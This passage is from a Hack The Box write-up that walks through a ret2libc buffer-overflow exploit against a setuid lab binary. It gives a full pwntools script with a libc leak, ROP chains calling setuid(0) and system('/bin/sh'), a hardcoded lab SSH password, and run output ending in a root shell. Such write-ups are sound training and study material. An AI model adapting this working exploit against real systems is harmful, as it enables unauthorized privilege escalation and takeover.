<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc.address = leak - libc.sym[<span class="string">"__libc_start_main"</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Calculated libc address: "</span> + hex(libc.address))</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/ellingson/exploit# ./exploit.py</span><br><span class="line">[+] Connecting to ellingson.htb on port <span class="number">22</span>: Done</span><br><span class="line">[*] margo@ellingson.htb:</span><br><span class="line">    Distro    Ubuntu <span class="number">18.04</span></span><br><span class="line">    OS:       linux</span><br><span class="line">    Arch:     amd64</span><br><span class="line">    Version:  <span class="number">4.15</span><span class="number">.0</span></span><br><span class="line">    ASLR:     Enabled</span><br><span class="line">[+] Starting remote process '/usr/bin/garbage' on ellingson.htb: pid 7858</span><br><span class="line">[*] '/root/Desktop/HTB/boxes/ellingson/exploit/garbage'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br><span class="line">[*] '/root/Desktop/HTB/boxes/ellingson/exploit/libc.so.6'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] Loaded cached gadgets for './garbage'</span><br><span class="line">[*] <span class="built_in">puts</span>@plt: <span class="number">0x401050</span></span><br><span class="line">[*] __libc_start_main: <span class="number">0x403ff0</span></span><br><span class="line">[*] pop rdi gadget: <span class="number">0x40179b</span></span><br><span class="line">[+] Leaked __libc_start_main: <span class="number">0x7f56b2056ab0</span></span><br><span class="line">[*] Calculated libc address: <span class="number">0x7f56b2035000</span></span><br></pre></td></tr></table></figure>

<h3 id="Exploitation-ret2libc"><a href="#Exploitation-ret2libc" class="headerlink" title="Exploitation: ret2libc"></a>Exploitation: ret2libc</h3><p>Similar to the function <code>leak()</code> I created another function called <code>shell()</code> that takes the same arguments as <code>leak()</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">(p,elf,libc,rop)</span>:</span></span><br></pre></td></tr></table></figure>
<p>This function will simply call the <code>pop rdi,ret</code> gadget and place <code>&quot;/bin/sh&quot;</code> in <code>rdi</code> then call <code>system()</code> which will take its argument from <code>rdi</code> and execute a shell.<br>We need the addresses of <code>ret</code> gadget, <code>pop rdi, ret</code> gadget, <code>&quot;/bin/sh&quot;</code> string from <code>libc</code>, <code>system()</code> from <code>libc</code>, to get them:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RET = rop.find_gadget([<span class="string">'ret'</span>])[<span class="number">0</span>]</span><br><span class="line">POP_RDI = (rop.find_gadget([<span class="string">'pop rdi'</span>, <span class="string">'ret'</span>]))[<span class="number">0</span>]</span><br><span class="line">BIN_SH = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">SYSTEM = libc.sym[<span class="string">"system"</span>]</span><br></pre></td></tr></table></figure>
<p>Then we will construct the payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">payload += p64(RET)</span><br><span class="line">payload += p64(POP_RDI)</span><br><span class="line">payload += p64(BIN_SH)</span><br><span class="line">payload += p64(SYSTEM)</span><br></pre></td></tr></table></figure>
<p>And finally we will send the payload and switch into interactive mode:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'password:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>Let’s test it:<br><code>exploit.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(p,elf,libc,rop)</span>:</span></span><br><span class="line">	POP_RDI = (rop.find_gadget([<span class="string">'pop rdi'</span>, <span class="string">'ret'</span>]))[<span class="number">0</span>]</span><br><span class="line">	LIBC_START_MAIN = elf.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">	PUTS = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">	MAIN = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">	</span><br><span class="line">	log.info(<span class="string">"puts@plt: "</span> + hex(PUTS))</span><br><span class="line">	log.info(<span class="string">"__libc_start_main: "</span> + hex(LIBC_START_MAIN))</span><br><span class="line">	log.info(<span class="string">"pop rdi gadget: "</span> + hex(POP_RDI))</span><br><span class="line">	</span><br><span class="line">	payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">	payload += p64(POP_RDI)</span><br><span class="line">	payload += p64(LIBC_START_MAIN)</span><br><span class="line">	payload += p64(PUTS)</span><br><span class="line">	payload += p64(MAIN)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'password:'</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	p.recvline()</span><br><span class="line">	p.recvline()</span><br><span class="line">	leak = p.recvline().strip()</span><br><span class="line">	leak = u64(leak.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">	log.success(<span class="string">"Leaked __libc_start_main: "</span> + hex(leak))</span><br><span class="line">	<span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">(p,elf,libc,rop)</span>:</span></span><br><span class="line">	RET = rop.find_gadget([<span class="string">'ret'</span>])[<span class="number">0</span>]</span><br><span class="line">	POP_RDI = (rop.find_gadget([<span class="string">'pop rdi'</span>, <span class="string">'ret'</span>]))[<span class="number">0</span>]</span><br><span class="line">	BIN_SH = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">	SYSTEM = libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">	log.success(<span class="string">"/bin/sh: "</span> + hex(BIN_SH))</span><br><span class="line">	log.success(<span class="string">"system: "</span> + hex(SYSTEM))</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">	payload += p64(RET)</span><br><span class="line">	payload += p64(POP_RDI)</span><br><span class="line">	payload += p64(BIN_SH)</span><br><span class="line">	payload += p64(SYSTEM)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'password:'</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">r = ssh(host=<span class="string">'ellingson.htb'</span>, user=<span class="string">'margo'</span>, password=<span class="string">'iamgod$08'</span>)</span><br><span class="line">p = r.process(<span class="string">'/usr/bin/garbage'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./garbage"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">leak = leak(p,elf,libc,rop)</span><br><span class="line">libc.address = leak - libc.sym[<span class="string">"__libc_start_main"</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Calculated libc address: "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line">shell(p,elf,libc,rop)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/ellingson/exploit# ./exploit.py </span><br><span class="line">[+] Connecting to ellingson.htb on port <span class="number">22</span>: Done</span><br><span class="line">[*] margo@ellingson.htb:</span><br><span class="line">    Distro    Ubuntu <span class="number">18.04</span></span><br><span class="line">    OS:       linux</span><br><span class="line">    Arch:     amd64</span><br><span class="line">    Version:  <span class="number">4.15</span><span class="number">.0</span></span><br><span class="line">    ASLR:     Enabled</span><br><span class="line">[+] Starting remote process '/usr/bin/garbage' on ellingson.htb: pid 8012</span><br><span class="line">[*] '/root/Desktop/HTB/boxes/ellingson/exploit/garbage'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br><span class="line">[*] '/root/Desktop/HTB/boxes/ellingson/exploit/libc.so.6'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] Loaded cached gadgets for './garbage'</span><br><span class="line">[*] <span class="built_in">puts</span>@plt: <span class="number">0x401050</span></span><br><span class="line">[*] __libc_start_main: <span class="number">0x403ff0</span></span><br><span class="line">[*] pop rdi gadget: <span class="number">0x40179b</span></span><br><span class="line">[+] Leaked __libc_start_main: <span class="number">0x7f63c8d7eab0</span></span><br><span class="line">[*] Calculated libc address: <span class="number">0x7f63c8d5d000</span></span><br><span class="line">[+] /bin/sh: <span class="number">0x7f63c8f10e9a</span></span><br><span class="line">[+] system: <span class="number">0x7f63c8dac440</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> </span><br><span class="line">access denied.</span><br><span class="line">$ $ whoami</span><br><span class="line">margo</span><br><span class="line">$ $ id</span><br><span class="line">uid=<span class="number">1002</span>(margo) gid=<span class="number">1002</span>(margo) groups=<span class="number">1002</span>(margo)</span><br><span class="line">$ $</span><br></pre></td></tr></table></figure>
<p>It works, but we get a shell as <code>margo</code> not <code>root</code></p>
<h3 id="Exploitation-setuid-–-gt-root-shell"><a href="#Exploitation-setuid-–-gt-root-shell" class="headerlink" title="Exploitation: setuid –&gt; root shell"></a>Exploitation: setuid –&gt; root shell</h3><p>To solve this we will create another chain that calls <code>setuid()</code> and sets our <code>uid</code> to 0.<br>I created a function called <code>suid()</code> that takes the same arguments as the other functions:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">suid</span><span class="params">(p,elf,libc,rop)</span>:</span></span><br></pre></td></tr></table></figure>
<p>This function will call the <code>pop rdi, ret</code> gadget and it will put a <code>0</code> in <code>rdi</code>, then it will call <code>setuid()</code> which will take its argument from <code>rdi</code> and will set our <code>uid</code> to 0, and finally it will call <code>main()</code> again.<br>We need the addresses of <code>pop rdi, ret</code> gadget, <code>setuid()</code> from <code>libc</code> and <code>main()</code> from the binary, to get them:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POP_RDI = (rop.find_gadget([<span class="string">'pop rdi'</span>, <span class="string">'ret'</span>]))[<span class="number">0</span>]</span><br><span class="line">SUID = libc.sym[<span class="string">'setuid'</span>]</span><br><span class="line">MAIN = elf.symbols[<span class="string">'main'</span>]</span><br></pre></td></tr></table></figure>
<p>Then we will construct the payload and send it:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">payload += p64(POP_RDI)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(SUID)</span><br><span class="line">payload += p64(MAIN)</span><br><span class="line">p.recvuntil(<span class="string">'password:'</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
<p>We will call this function before calling <code>shell()</code> so our final exploit will be:<br><code>exploit.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(p,elf,libc,rop)</span>:</span></span><br><span class="line">	POP_RDI = (rop.find_gadget([<span class="string">'pop rdi'</span>, <span class="string">'ret'</span>]))[<span class="number">0</span>]</span><br><span class="line">	LIBC_START_MAIN = elf.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">	PUTS = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">	MAIN = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">	</span><br><span class="line">	log.info(<span class="string">"puts@plt: "</span> + hex(PUTS))</span><br><span class="line">	log.info(<span class="string">"__libc_start_main: "</span> + hex(LIBC_START_MAIN))</span><br><span class="line">	log.info(<span class="string">"pop rdi gadget: "</span> + hex(POP_RDI))</span><br><span class="line">	</span><br><span class="line">	payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">	payload += p64(POP_RDI)</span><br><span class="line">	payload += p64(LIBC_START_MAIN)</span><br><span class="line">	payload += p64(PUTS)</span><br><span class="line">	payload += p64(MAIN)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'password:'</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	p.recvline()</span><br><span class="line">	p.recvline()</span><br><span class="line">	leak = p.recvline().strip()</span><br><span class="line">	leak = u64(leak.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">	log.success(<span class="string">"Leaked __libc_start_main: "</span> + hex(leak))</span><br><span class="line">	<span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">suid</span><span class="params">(p,elf,libc,rop)</span>:</span></span><br><span class="line">	POP_RDI = (rop.find_gadget([<span class="string">'pop rdi'</span>, <span class="string">'ret'</span>]))[<span class="number">0</span>]</span><br><span class="line">	SUID = libc.sym[<span class="string">'setuid'</span>]</span><br><span class="line">	MAIN = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">	payload += p64(POP_RDI)</span><br><span class="line">	payload += p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(SUID)</span><br><span class="line">	payload += p64(MAIN)</span><br><span class="line">	p.recvuntil(<span class="string">'password:'</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">(p,elf,libc,rop)</span>:</span></span><br><span class="line">	RET = rop.find_gadget([<span class="string">'ret'</span>])[<span class="number">0</span>]</span><br><span class="line">	POP_RDI = (rop.find_gadget([<span class="string">'pop rdi'</span>, <span class="string">'ret'</span>]))[<span class="number">0</span>]</span><br><span class="line">	BIN_SH = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">	SYSTEM = libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">	log.success(<span class="string">"/bin/sh: "</span> + hex(BIN_SH))</span><br><span class="line">	log.success(<span class="string">"system: "</span> + hex(SYSTEM))</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">	payload += p64(RET)</span><br><span class="line">	payload += p64(POP_RDI)</span><br><span class="line">	payload += p64(BIN_SH)</span><br><span class="line">	payload += p64(SYSTEM)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'password:'</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">r = ssh(host=<span class="string">'ellingson.htb'</span>, user=<span class="string">'margo'</span>, password=<span class="string">'iamgod$08'</span>)</span><br><span class="line">p = r.process(<span class="string">'/usr/bin/garbage'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./garbage"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">leak = leak(p,elf,libc,rop)</span><br><span class="line">libc.address = leak - libc.sym[<span class="string">"__libc_start_main"</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Calculated libc address: "</span> + hex(libc.address))</span><br><span class="line">log.info(<span class="string">"Setting uid to 0"</span>)</span><br><span class="line"></span><br><span class="line">suid(p,elf,libc,rop)</span><br><span class="line">shell(p,elf,libc,rop)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/ellingson/exploit# ./exploit.py </span><br><span class="line">[+] Connecting to ellingson.htb on port <span class="number">22</span>: Done</span><br><span class="line">[*] margo@ellingson.htb:</span><br><span class="line">    Distro    Ubuntu <span class="number">18.04</span></span><br><span class="line">    OS:       linux</span><br><span class="line">    Arch:     amd64</span><br><span class="line">    Version:  <span class="number">4.15</span><span class="number">.0</span></span><br><span class="line">    ASLR:     Enabled</span><br><span class="line">[+] Starting remote process '/usr/bin/garbage' on ellingson.htb: pid 8111</span><br><span class="line">[*] '/root/Desktop/HTB/boxes/ellingson/exploit/garbage'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br><span class="line">[*] '/root/Desktop/HTB/boxes/ellingson/exploit/libc.so.6'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] Loaded cached gadgets for './garbage'</span><br><span class="line">[*] <span class="built_in">puts</span>@plt: <span class="number">0x401050</span></span><br><span class="line">[*] __libc_start_main: <span class="number">0x403ff0</span></span><br><span class="line">[*] pop rdi gadget: <span class="number">0x40179b</span></span><br><span class="line">[+] Leaked __libc_start_main: <span class="number">0x7f0e56addab0</span></span><br><span class="line">[*] Calculated libc address: <span class="number">0x7f0e56abc000</span></span><br><span class="line">[*] Setting uid to <span class="number">0</span></span><br><span class="line">[+] /bin/sh: <span class="number">0x7f0e56c6fe9a</span></span><br><span class="line">[+] system: <span class="number">0x7f0e56b0b440</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> </span><br><span class="line">access denied.</span><br><span class="line"># $ whoami</span><br><span class="line">root</span><br><span class="line"># $ id</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">1002</span>(margo) groups=<span class="number">1002</span>(margo)</span><br><span class="line"># $</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/ellingson/12.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/writeup/">Hack The Box - Writeup</a><br>Next Hack The Box write-up: <a href="/hack-the-box/safe/">Hack The Box - Safe</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-10-19</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/binary-exploitation/" rel="tag">#binary-exploitation</a> <a class="tag-link" href="/tags/buffer-overflow/" rel="tag">#buffer-overflow</a> <a class="tag-link" href="/tags/exploit-development/" rel="tag">#exploit-development</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/python/" rel="tag">#python</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
